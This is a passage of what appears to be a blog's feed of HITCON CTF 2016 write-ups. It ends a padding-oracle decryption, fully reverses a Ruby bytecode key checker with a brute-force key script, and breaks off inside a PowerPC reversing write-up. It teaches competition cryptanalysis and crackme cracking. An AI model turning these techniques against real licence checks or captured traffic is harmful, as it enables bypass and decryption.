sss):</span><br><span class="line">        s |= ord(c1)^ord(c2)</span><br><span class="line">        s&lt;&lt;=<span class="number">8</span></span><br><span class="line">    f = hex(s&gt;&gt;<span class="number">8</span>)[<span class="number">2</span>:<span class="number">-1</span>:]</span><br><span class="line">    f = fix_len(f)</span><br><span class="line"></span><br><span class="line">    plain += f.decode(<span class="string">'hex'</span>)</span><br><span class="line">    cnt += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> plain</span><br></pre></td></tr></table></figure></p><p><code>ggg</code> is a file that store the value of <code>encrypt(secret)</code> and all the last attacker’s ciphertext ( grab it from pcap file with the help of <code>strings</code> &amp; <code>grep</code> )</p><p>And so we have the decrypted message:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">In cryptography, a padding oracle attack is an attack which is performed using the padding of a cryptographic message.</span><br><span class="line">hitcon&#123;H4cked by a de1ici0us pudding &apos;3&apos;&#125;</span><br><span class="line">In cryptography, variable-length plaintext messages often have to be padded (expanded) to be compatible with the underlying cryptographic primitive.</span><br></pre></td></tr></table></figure></p><p>flag: <code>hitcon{H4cked by a de1ici0us pudding &#39;3&#39;}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Crypto &amp;amp; Forensics&lt;br&gt;&lt;strong&gt;Points:&lt;/strong&gt; 150&lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="Python" scheme="https://bruce30262.github.io/tags/Python/"/>
    
      <category term="Crypto" scheme="https://bruce30262.github.io/tags/Crypto/"/>
    
      <category term="Forensic" scheme="https://bruce30262.github.io/tags/Forensic/"/>
    
      <category term="HITCON" scheme="https://bruce30262.github.io/tags/HITCON/"/>
    
      <category term="padding_oracle_attack" scheme="https://bruce30262.github.io/tags/padding-oracle-attack/"/>
    
  </entry>
  
  <entry>
    <title>HITCON CTF 2016 Quals -- ROP</title>
    <link href="https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-rop/"/>
    <id>https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-rop/</id>
    <published>2016-10-10T08:07:00.000Z</published>
    <updated>2018-01-03T15:08:05.599Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> Reverse<br><strong>Points:</strong> 250</p><a id="more"></a>  <p>The challenge gave us a file call <code>rop.iseq</code>. By checking the file header, I found that it was a binary format of Ruby’s <a href="https://ilconnettivo.wordpress.com/2015/12/25/ruby-2-3-0-instructionsequence/" target="_blank" rel="noopener">InstructionSequence</a>. </p><p>By googling the InstructionSequence, I found that there are some new features were added into the ruby version 2.3, for example the <a href="http://ruby-doc.org/core-2.3.0/RubyVM/InstructionSequence.html#method-c-load_from_binary" target="_blank" rel="noopener">load_from_binary</a> method. We can actually use these methods to load the instruction sequence from a binary file, and disassemble the instruction to a human readable format.  </p><figure class="highlight ruby"><figcaption><span>de.rb</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># read rop.iseq, dump InstructionSequence</span></span><br><span class="line"></span><br><span class="line">f = open(<span class="string">"rop.iseq"</span>, <span class="string">"rb"</span>)</span><br><span class="line">a = f.read()</span><br><span class="line">d = RubyVM::InstructionSequence.load_from_binary(a)</span><br><span class="line"></span><br><span class="line"><span class="comment">#d.eval #execute the instruction sequence</span></span><br><span class="line">puts d.disasm <span class="comment"># print out the disassemble result</span></span><br></pre></td></tr></table></figure><p>If we execute the line <code>d.eval</code>, it will run the instruction sequence:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">bruce30262@ubuntu:~/Desktop$ ruby ./de.rb </span><br><span class="line">AAAA</span><br><span class="line">Invalid Key @_@</span><br></pre></td></tr></table></figure></p><p>Looks like the program will read our input and do some checking, then output the checking result.   </p><p>Anyway let’s dump the disassemble result and start reversing. <a href="https://gist.github.com/bruce30262/1e8fd1439f13e75cf72e0c265dd612de" target="_blank" rel="noopener">Here</a>‘s the whole disassemble result.<br><figure class="highlight plain"><figcaption><span>disassemble result</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">== disasm: #&lt;ISeq:&lt;compiled&gt;@&lt;compiled&gt;&gt;================================</span><br><span class="line">== catch table</span><br><span class="line">| catch type: break  st: 0096 ed: 0102 sp: 0000 cont: 0102</span><br><span class="line">| catch type: break  st: 0239 ed: 0245 sp: 0000 cont: 0245</span><br><span class="line">|------------------------------------------------------------------------</span><br><span class="line">local table (size: 3, argc: 0 [opts: 0, rest: -1, post: 0, block: -1, kw: -1@-1, kwrest: -1])</span><br><span class="line">[ 3] k          [ 2] xs         </span><br><span class="line">0000 trace            1                                               (   1)</span><br><span class="line">0002 putself          </span><br><span class="line">0003 putstring        &quot;digest&quot;</span><br><span class="line">0005 opt_send_without_block &lt;callinfo!mid:require, argc:1, FCALL|ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0008 pop              </span><br><span class="line">0009 trace            1                                               (   2)</span><br><span class="line">0011 putself          </span><br><span class="line">0012 putstring        &quot;prime&quot;</span><br><span class="line">0014 opt_send_without_block &lt;callinfo!mid:require, argc:1, FCALL|ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0017 pop              </span><br><span class="line">0018 trace            1                                               (   4)</span><br><span class="line">0020 putspecialobject 3</span><br><span class="line">0022 putnil        </span><br><span class="line">................................................</span><br><span class="line">............... lots of stuff....................</span><br><span class="line">0056 opt_send_without_block &lt;callinfo!mid:gets, argc:0, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0059 opt_send_without_block &lt;callinfo!mid:chomp, argc:0, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0062 setlocal_OP__WC__0 3</span><br><span class="line">0064 trace            1                                               (  39)</span><br><span class="line">0066 getlocal_OP__WC__0 3</span><br><span class="line">0068 putstring        &quot;-&quot;</span><br><span class="line">0070 opt_send_without_block &lt;callinfo!mid:split, argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0073 setlocal_OP__WC__0 2</span><br><span class="line">0075 trace            1                                               (  40)</span><br><span class="line">0077 getlocal_OP__WC__0 2</span><br><span class="line">0079 opt_size         &lt;callinfo!mid:size, argc:0, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0082 putobject        5</span><br><span class="line">0084 opt_eq           &lt;callinfo!mid:==, argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0087 branchif         94</span><br><span class="line">................................................</span><br><span class="line">............... lots of stuff....................</span><br></pre></td></tr></table></figure></p><p>Google is our friend. I found a useful <a href="http://kgrz.io/2014/04/19/ruby-trace-leave-oh-my.html" target="_blank" rel="noopener">reference</a> for introducing basic ruby instruction sequence reversing. </p><p>For example for the following iseq:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0000 trace            1                                               (   1)</span><br><span class="line">0002 putself          </span><br><span class="line">0003 putstring        &quot;digest&quot;</span><br><span class="line">0005 opt_send_without_block &lt;callinfo!mid:require, argc:1, FCALL|ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br></pre></td></tr></table></figure></p><p><code>trace 1</code> means “A new line of Ruby code has been encountered”. Then by reading the following lines, we know that the line of the code was probably <code>require &quot;digest&quot;</code>.   </p><p>And so we can try to reverse the whole iseq by following the similar pattern. First we found the code that read the user input:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># input = gets.chomp</span><br><span class="line">0056 opt_send_without_block &lt;callinfo!mid:gets, argc:0, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0059 opt_send_without_block &lt;callinfo!mid:chomp, argc:0, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0062 setlocal_OP__WC__0 3</span><br></pre></td></tr></table></figure></p><p>So <code>local_OP__WC__0 3</code> will be our input. Now for the first check: </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"># input.split(&quot;-&quot;)</span><br><span class="line">0064 trace            1                                               (  39)</span><br><span class="line">0066 getlocal_OP__WC__0 3</span><br><span class="line">0068 putstring        &quot;-&quot;</span><br><span class="line">0070 opt_send_without_block &lt;callinfo!mid:split, argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line"></span><br><span class="line"># input.split(&quot;-&quot;).size == 5</span><br><span class="line">0073 setlocal_OP__WC__0 2</span><br><span class="line">0075 trace            1                                               (  40)</span><br><span class="line">0077 getlocal_OP__WC__0 2</span><br><span class="line">0079 opt_size         &lt;callinfo!mid:size, argc:0, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0082 putobject        5</span><br><span class="line">0084 opt_eq           &lt;callinfo!mid:==, argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0087 branchif         94</span><br><span class="line"></span><br><span class="line"># if input.split(&quot;-&quot;).size != 5, call gg() (which print &quot;Invalid key @_@&quot;)</span><br><span class="line">0089 putself          </span><br><span class="line">0090 opt_send_without_block &lt;callinfo!mid:gg, argc:0, FCALL|VCALL|ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0093 pop             </span><br><span class="line"></span><br><span class="line"># input.split(&quot;-&quot;).all? must be true</span><br><span class="line">0094 trace            1                                               (  41)</span><br><span class="line">0096 getlocal_OP__WC__0 2</span><br><span class="line">0098 send             &lt;callinfo!mid:all?, argc:0&gt;, &lt;callcache&gt;, block in &lt;compiled&gt;</span><br><span class="line">0102 branchif         109</span><br><span class="line">0104 putself          </span><br><span class="line">0105 opt_send_without_block &lt;callinfo!mid:gg, argc:0, FCALL|VCALL|ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br></pre></td></tr></table></figure><p>We can see that the valid key format must be something like “X-X-X-X-X”. Here I also found a sequence of iseq which help us infer the precise key format:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0000 trace            256                                             (  41)</span><br><span class="line">0002 trace            1</span><br><span class="line">0004 getlocal_OP__WC__0 2</span><br><span class="line">0006 putobject        /^[0-9A-F]&#123;4&#125;$/ &lt;-- here</span><br><span class="line">0008 opt_regexpmatch2 &lt;callinfo!mid:=~, argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0011 trace            512</span><br></pre></td></tr></table></figure><p>So now we know that the key format is “XXXX-XXXX-XXXX-XXXX-XXXX”, while “X” is in the range of <code>[0-9A-F]</code>. Time to recover the valid key.</p><p>The checking of the first part of the key was pretty simple:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># local_OP__WC__0 2 = input.split(&quot;-&quot;), let&apos;s call it key</span><br><span class="line">0111 getlocal_OP__WC__0 2</span><br><span class="line">0113 putobject_OP_INT2FIX_O_0_C_ </span><br><span class="line"></span><br><span class="line"># key[0].to_i(16) = 31337</span><br><span class="line">0114 opt_aref         &lt;callinfo!mid:[], argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0117 putobject        16</span><br><span class="line">0119 opt_send_without_block &lt;callinfo!mid:to_i, argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0122 putobject        31337</span><br><span class="line">0124 opt_eq           &lt;callinfo!mid:==, argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0127 branchif         134</span><br></pre></td></tr></table></figure></p><p>So <code>key[0]</code> is <code>hex(31337)</code> = <code>7A69</code><br>The checking of the second part of the key is even more simple:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># key[1].reverse == &quot;FACE&quot;</span><br><span class="line">0136 getlocal_OP__WC__0 2</span><br><span class="line">0138 putobject_OP_INT2FIX_O_1_C_ </span><br><span class="line">0139 opt_aref         &lt;callinfo!mid:[], argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0142 opt_send_without_block &lt;callinfo!mid:reverse, argc:0, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0145 putstring        &quot;FACE&quot;</span><br><span class="line">0147 opt_eq           &lt;callinfo!mid:==, argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0150 branchif         157</span><br></pre></td></tr></table></figure></p><p>So <code>key[1]</code> = <code>&quot;FACE&quot;.reverse</code> = <code>ECAF</code>. </p><p>To verify if <code>key[0]</code> and <code>key[1]</code> were the right value, we can actually use the following command to trace the ruby code: <code>ruby -r tracer de.rb</code>. If the key was correct, it would perform more checking, which means it will execute more line of code, so we can know if a part of the key was right or wrong by observing the trace of the ruby tracer ( kind of a side-channel analysis. )</p><p>Back to our recovering procedure. The checking of the <code>key[2]</code> looks like this:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># call f(217, key[2].to_i(16), 314159)</span><br><span class="line">0160 putobject        217</span><br><span class="line">0162 getlocal_OP__WC__0 2</span><br><span class="line">0164 putobject        2</span><br><span class="line">0166 opt_aref         &lt;callinfo!mid:[], argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0169 putobject        16</span><br><span class="line">0171 opt_send_without_block &lt;callinfo!mid:to_i, argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0174 putobject        314159</span><br><span class="line">0176 opt_send_without_block &lt;callinfo!mid:f, argc:3, FCALL|ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line"></span><br><span class="line"># return_value.to_s(28).upcase should be &quot;48D5&quot;</span><br><span class="line">0179 putobject        28</span><br><span class="line">0181 opt_send_without_block &lt;callinfo!mid:to_s, argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0184 opt_send_without_block &lt;callinfo!mid:upcase, argc:0, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0187 putstring        &quot;48D5&quot;</span><br><span class="line">0189 opt_eq           &lt;callinfo!mid:==, argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0192 branchif         199</span><br></pre></td></tr></table></figure></p><p>It will first call a method <code>f</code>, with argument (<code>217</code>, <code>key[2].to_i(16)</code>, <code>314159</code>), then check if its return value = <code>94449</code> ( with 28 as base, <code>48D5</code> is actually <code>94449</code> in base 10 )</p><p>method <code>f</code> was kind of complicated, so I will just post the pseudo code instead:<br><figure class="highlight ruby"><figcaption><span>f</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(two17, key2, pi)</span></span></span><br><span class="line">    ret = <span class="number">1</span></span><br><span class="line">    v2 = two17</span><br><span class="line">    <span class="keyword">while</span> key2 != <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> key2[<span class="number">0</span>] == <span class="number">1</span> <span class="comment"># the first bit of current key2</span></span><br><span class="line">            ret = (ret*v2)%pi</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        key2 = key2<span class="meta">&gt;&gt;</span><span class="number">1</span></span><br><span class="line">        v2 = (v2*v2)%pi</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>Since we know that <code>key[2]</code>‘s format is <code>0000</code> ~ <code>FFFF</code>, we can just crack <code>key[2]</code> by writing a simple crackme:<br><figure class="highlight ruby"><figcaption><span>crack_part3.rb</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(two17, key2, pi)</span></span></span><br><span class="line">    ret = <span class="number">1</span></span><br><span class="line">    v2 = two17</span><br><span class="line">    <span class="keyword">while</span> key2 != <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> key2[<span class="number">0</span>] == <span class="number">1</span> <span class="comment"># the first bit of current key2</span></span><br><span class="line">            ret = (ret*v2)%pi</span><br><span class="line">        <span class="keyword">end</span></span><br><span class="line">        key2 = key2<span class="meta">&gt;&gt;</span><span class="number">1</span></span><br><span class="line">        v2 = (v2*v2)%pi</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line">    <span class="keyword">return</span> ret</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">0</span>..<span class="number">0xffff</span>)</span><br><span class="line">    ret = f(<span class="number">217</span>,i, <span class="number">314159</span>)</span><br><span class="line">    <span class="keyword">if</span> ret == <span class="number">94449</span></span><br><span class="line">        puts <span class="string">"got it!"</span></span><br><span class="line">        puts i.to_s(<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>And so we got the value of <code>key[2]</code>: <code>1BD2</code></p><p>Moving on to the next part (<code>key[3]</code>):<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0201 getlocal_OP__WC__0 2</span><br><span class="line">0203 putobject        3</span><br><span class="line">0205 opt_aref         &lt;callinfo!mid:[], argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0208 putobject        10</span><br><span class="line">0210 opt_send_without_block &lt;callinfo!mid:to_i, argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0213 opt_send_without_block &lt;callinfo!mid:prime_division, argc:0, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0216 putobject        :first</span><br><span class="line">0218 send             &lt;callinfo!mid:map, argc:0, ARGS_BLOCKARG&gt;, &lt;callcache&gt;, nil</span><br><span class="line">0222 opt_send_without_block &lt;callinfo!mid:sort, argc:0, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0225 duparray         [53, 97]</span><br><span class="line">0227 opt_eq           &lt;callinfo!mid:==, argc:1, ARGS_SIMPLE&gt;, &lt;callcache&gt;</span><br><span class="line">0230 branchif         237</span><br></pre></td></tr></table></figure></p><p>At first I was confused at line 0216 ~ 0218. There’s a <code>:first</code> for <code>map</code>, but the argc of <code>map</code> was actually <code>0</code>. After doing some search on the internet, I found <a href="http://qiita.com/yui-knk/items/f7ce1c3138ef44872d3b" target="_blank" rel="noopener">this</a> post and found out that the check was actually doing:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b = key[<span class="number">3</span>].to_i(<span class="number">10</span>).prime_division.map &amp;<span class="symbol">:first</span></span><br><span class="line">b.sort == [<span class="number">53</span>,<span class="number">97</span>]</span><br></pre></td></tr></table></figure></p><p>So the value of <code>key[3]</code> is <code>53*97 == 5141</code> ( base 10 )</p><p>At this point we know the valid key is <code>7A69-ECAF-1BD2-5141-XXXX</code>. The checking of the last part of the key was also kind of complicated and I was kind of lazy to reverse the whole thing. So far we have the first four part of the key, and there’s only one left …… so why don’t we use the old typical brute force attack to recover the last one ? ;)<br><figure class="highlight ruby"><figcaption><span>crack_flag.rb</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env ruby</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> (<span class="number">0</span>..<span class="number">0xffff</span>)</span><br><span class="line">    key = <span class="string">"7A69-ECAF-1BD2-5141-%04X"</span> % i</span><br><span class="line">    cmd = <span class="string">"echo \"<span class="subst">#&#123;key&#125;</span>\"|ruby de.rb "</span></span><br><span class="line">    puts cmd</span><br><span class="line">    resp = <span class="string">`<span class="subst">#&#123;cmd&#125;</span>`</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> resp.<span class="keyword">include</span>?<span class="string">"Invalid"</span></span><br><span class="line">        puts resp</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">end</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure></p><p>And after about 20 minutes….<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">........................</span><br><span class="line">echo &quot;7A69-ECAF-1BD2-5141-CA70&quot;|ruby de.rb</span><br><span class="line">echo &quot;7A69-ECAF-1BD2-5141-CA71&quot;|ruby de.rb</span><br><span class="line">echo &quot;7A69-ECAF-1BD2-5141-CA72&quot;|ruby de.rb</span><br><span class="line">Congratz! flag is hitcon&#123;ROP = Ruby Obsecured Programming ^_&lt;&#125;</span><br></pre></td></tr></table></figure></p><p>Looks like I should brute force the key from <code>0xffff</code> down to <code>0</code> though :P<br>Anyway, the valid key is <code>7A69-ECAF-1BD2-5141-CA72</code>, and so we got the flag ! </p><p>flag: <code>hitcon{ROP = Ruby Obsecured Programming ^_&lt;}</code></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;strong&gt;Category:&lt;/strong&gt; Reverse&lt;br&gt;&lt;strong&gt;Points:&lt;/strong&gt; 250&lt;/p&gt;
    
    </summary>
    
      <category term="write-ups" scheme="https://bruce30262.github.io/categories/write-ups/"/>
    
    
      <category term="CTF" scheme="https://bruce30262.github.io/tags/CTF/"/>
    
      <category term="ruby" scheme="https://bruce30262.github.io/tags/ruby/"/>
    
      <category term="Reversing" scheme="https://bruce30262.github.io/tags/Reversing/"/>
    
      <category term="HITCON" scheme="https://bruce30262.github.io/tags/HITCON/"/>
    
  </entry>
  
  <entry>
    <title>HITCON CTF 2016 Quals -- flame</title>
    <link href="https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-flame/"/>
    <id>https://bruce30262.github.io/2016/10/10/2016-10-10-hitcon-ctf-2016-quals-flame/</id>
    <published>2016-10-10T08:06:00.000Z</published>
    <updated>2018-01-03T15:08:05.599Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Category:</strong> PPC ( more like Reverse )<br><strong>Points:</strong> 150</p><a id="more"></a>  <p>We were given a 32 bit PowerPC ELF.<br>Fortunately I’ve got <strong>qemu-ppc-static</strong> installed on my <a href="https://github.com/bruce30262/ctf-box" target="_blank" rel="noopener">ctf-box</a>, so we can actually run the program by the following command:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># root @ 9c51322c8256 in /mnt/files/hitcon-ctf-2016-qual/flame [7:51:02] </span><br><span class="line">$ qemu-ppc-static ./flame</span><br><span class="line">*************************************</span><br><span class="line">*                                   *</span><br><span class="line">*   HITCON CTF 2016 Flag Verifier   *</span><br><span class="line">*                                   *</span><br><span class="line">*************************************</span><br><span class="line">Check your flag before submission: AAAA</span><br><span class="line">Your flag is incorrect :(</span><br></pre></td></tr></table></figure></p><p>Kind of appreciate that this is a static linked binary, because if it’s a dynamic linked binary then I’ll have to spend more time to installed the PPC version of libc.  </p><p>Anyway we can see that the program will ask us to input the flag, and check if the flag is correct or not.</p><p>To do the dynamic analysis, I first use <code>qemu-ppc-static -g 10001 ./flame</code> to launch the program and listen for a gdb connection at port 10001, then I use <strong>gdb-multiarch</strong> to debug the program with <code>target remote localhost:10001</code>. As for the static analysis, I launch the program with IDA Pro.</p><p>After done some reversing, I summarize the program behavior with the following pseudo code:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>, flag); <span class="comment">// let's just ignore the buffer overflow lol</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">strlen</span>(flag) == <span class="number">35</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        srandom(<span class="number">0x1e61</span>);</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; <span class="number">35</span> ; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            r = rand();</span><br><span class="line">            check[i] = flag[i] ^ (r &amp; <span class="number">0xfff</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span> ; i &lt; <span class="number">35</span> ; i++)</span><br><span 